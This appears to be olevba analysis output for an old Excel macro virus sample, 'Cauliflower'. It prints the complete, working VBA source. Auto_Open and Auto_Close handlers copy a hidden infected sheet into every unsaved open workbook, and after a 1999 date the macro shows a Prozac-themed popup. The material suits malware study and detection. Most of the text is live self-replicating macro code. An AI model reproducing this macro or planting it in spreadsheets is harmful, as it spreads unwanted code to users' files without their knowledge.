olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Cauliflower.a-773f30619e48498a1086243d9bbd005c38728d23
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO cauliflower.bas 
in file: Virus.MSExcel.Cauliflower.a-773f30619e48498a1086243d9bbd005c38728d23 - OLE stream: '_VBA_PROJECT_CUR/VBA/cauliflower'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






Option Private Module

Private Const deadline = 36161 '01/01/1999

Sub Auto_Open()
    On Error GoTo finish
    Application.ScreenUpdating = False
    For Each wb In Workbooks
        If Not wb.Saved Then
            infect = True
            For Each mdl In wb.Modules
                If mdl.Name = "cauliflower" Then
                    infect = False
                    Exit For
                End If
            Next
            If infect Then
' ***           MULTIPLYING SUBROUTINE STARTS HERE
                ThisWorkbook.Sheets("cauliflower").Copy before:=wb.Sheets(1)
                ActiveWindow.SelectedSheets.Visible = False
' ***           MULTIPLYING SUBROUTINE ENDS HERE
            End If
        End If
    Next
    If DateValue(Date) >= deadline Then
'***    THE "FUNNY MESSAGE" SUBROUTINE STARTS HERE
        answer = MsgBox("Are you depressed", vbYesNo, "LILLY RESCUE MISSION")
        If answer = vbYes Then
            MsgBox ("Depression hurts. PROZAC can help.")
        End If
'***    THE "FUNNY MESSAGE" SUBROUTINE ENDS HERE
    End If
finish:
    ThisWorkbook.Activate
    Application.ScreenUpdating = True
End Sub

Sub Auto_Close()
    Auto_Open
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     19 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  cauliflowe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
+----------+--------------------+---------------------------------------------+

